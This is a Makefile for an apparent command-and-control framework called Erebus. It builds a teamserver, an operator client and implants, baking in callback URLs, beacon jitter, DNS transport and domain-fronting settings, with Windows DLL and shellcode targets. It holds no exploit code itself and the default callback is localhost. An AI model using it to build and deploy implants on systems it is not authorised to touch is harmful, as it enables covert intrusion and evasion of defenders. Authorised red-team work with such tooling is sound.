MODULE      = github.com/KKingZero/erebus-exploit-framwork
EREBUS      = ./cmd/erebus
TEAMSERVER  = ./cmd/teamserver
IMPLANT     = ./cmd/implant
OPERATOR    = ./cmd/operator
AGENT       = ./cmd/agent
BUILD_DIR   = ./build
PREFIX      ?= $(HOME)/.local
BINDIR      ?= $(PREFIX)/bin

# Implant build-time config (override via env or make args).
# Prefer openssl/python over xxd (xxd is often missing on minimal hosts).
IMPLANT_ID     ?= $(shell openssl rand -hex 16 2>/dev/null || python3 -c 'import secrets;print(secrets.token_hex(16))')
IMPLANT_SECRET ?= $(shell openssl rand -hex 32 2>/dev/null || python3 -c 'import secrets;print(secrets.token_hex(32))')
CALLBACK_URL   ?= https://127.0.0.1:8443
SLEEP_MS       ?= 5000
JITTER_PCT     ?= 20

# Fail closed: never inject empty ldflags (empty ID crashes implant at LoadConfig).
ifeq ($(strip $(IMPLANT_ID)),)
$(error IMPLANT_ID is empty — install openssl or python3, or pass IMPLANT_ID=...)
endif
ifeq ($(strip $(IMPLANT_SECRET)),)
$(error IMPLANT_SECRET is empty — install openssl or python3, or pass IMPLANT_SECRET=...)
endif
ifneq ($(shell printf '%s' '$(IMPLANT_SECRET)' | wc -c),64)
$(error IMPLANT_SECRET must be 64 hex chars (32 bytes), got $(shell printf '%s' '$(IMPLANT_SECRET)' | wc -c))
endif

# CA cert for TLS pinning (optional, set CA_CERT_PATH to embed)
CA_CERT_PATH   ?=
CA_CERT_PEM    ?= $(if $(CA_CERT_PATH),$(shell base64 -w0 $(CA_CERT_PATH)),)

# Transport config (override for DNS)
TRANSPORT_TYPE ?= https
DNS_DOMAIN     ?=
DNS_SERVER     ?=

# Domain fronting / redirector
CDN_DOMAIN     ?=

LDFLAGS = -s -w \
	-X '$(MODULE)/implant.implantID=$(IMPLANT_ID)' \
	-X '$(MODULE)/implant.implantSecret=$(IMPLANT_SECRET)' \
	-X '$(MODULE)/implant.callbackURL=$(CALLBACK_URL)' \
	-X '$(MODULE)/implant.sleepMs=$(SLEEP_MS)' \
	-X '$(MODULE)/implant.jitterPct=$(JITTER_PCT)' \
	-X '$(MODULE)/implant.caCertPEM=$(CA_CERT_PEM)' \
	-X '$(MODULE)/implant.transportType=$(TRANSPORT_TYPE)' \
	-X '$(MODULE)/implant.dnsDomain=$(DNS_DOMAIN)' \
	-X '$(MODULE)/implant.dnsServer=$(DNS_SERVER)' \
	-X '$(MODULE)/implant.cdnDomain=$(CDN_DOMAIN)'

.PHONY: all proto erebus teamserver implant implant-win implant-dll implant-shellcode implant-c operator agent install uninstall clean

all: proto erebus teamserver implant operator agent

install: erebus
	@mkdir -p $(BINDIR)
	install -m 755 $(BUILD_DIR)/erebus $(BINDIR)/erebus
	@ln -sf erebus $(BINDIR)/Erebus
	@echo "Installed: $(BINDIR)/erebus and $(BINDIR)/Erebus"
	@echo "Ensure $(BINDIR) is in your PATH (e.g. export PATH=\"$(BINDIR):\$$PATH\")"

uninstall:
	rm -f $(BINDIR)/erebus $(BINDIR)/Erebus
	@echo "Removed $(BINDIR)/erebus and $(BINDIR)/Erebus"

proto:
	cd proto && bash generate.sh

erebus:
	@mkdir -p $(BUILD_DIR)
	go build -o $(BUILD_DIR)/erebus $(EREBUS)

teamserver:
	@mkdir -p $(BUILD_DIR)
	go build -o $(BUILD_DIR)/teamserver $(TEAMSERVER)

implant:
	@mkdir -p $(BUILD_DIR)
	go build -ldflags "$(LDFLAGS)" -o $(BUILD_DIR)/implant $(IMPLANT)

implant-win:
	@mkdir -p $(BUILD_DIR)
	GOOS=windows GOARCH=amd64 go build -ldflags "$(LDFLAGS)" -o $(BUILD_DIR)/implant.exe $(IMPLANT)

operator:
	@mkdir -p $(BUILD_DIR)
	go build -o $(BUILD_DIR)/operator $(OPERATOR)

agent:
	@mkdir -p $(BUILD_DIR)
	go build -o $(BUILD_DIR)/agent $(AGENT)

implant-dll:
	@mkdir -p $(BUILD_DIR)
	CGO_ENABLED=1 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc \
		go build -buildmode=c-shared -tags dll -ldflags "$(LDFLAGS)" \
		-o $(BUILD_DIR)/implant.dll $(IMPLANT)

implant-shellcode: implant-win
	@mkdir -p $(BUILD_DIR)
	go run ./cmd/tools/pe2shellcode -i $(BUILD_DIR)/implant.exe -o $(BUILD_DIR)/implant.bin

LLVM_MINGW_BIN ?= $(CURDIR)/.toolchain/llvm-mingw/bin
MINGW_BIN      ?= $(CURDIR)/.toolchain/mingw-root/usr/bin
ifneq ($(wildcard $(LLVM_MINGW_BIN)/x86_64-w64-mingw32-gcc),)
  C_TOOLCHAIN_BIN := $(LLVM_MINGW_BIN)
else
  C_TOOLCHAIN_BIN := $(MINGW_BIN)
endif
implant-c:
	PATH="$(C_TOOLCHAIN_BIN):$$PATH" $(MAKE) -C cimplant all \
		IMPLANT_ID="$(IMPLANT_ID)" \
		IMPLANT_SECRET="$(IMPLANT_SECRET)" \
		CALLBACK_URL="$(CALLBACK_URL)" \
		SLEEP_MS="$(SLEEP_MS)" \
		JITTER_PCT="$(JITTER_PCT)" \
		CA_CERT_PEM="$(CA_CERT_PEM)" \
		TRANSPORT_TYPE="$(TRANSPORT_TYPE)" \
		DNS_DOMAIN="$(DNS_DOMAIN)" \
		DNS_SERVER="$(DNS_SERVER)" \
		CDN_DOMAIN="$(CDN_DOMAIN)"

clean:
	rm -rf $(BUILD_DIR)
	rm -f pkg/pb/*.go
	$(MAKE) -C cimplant clean
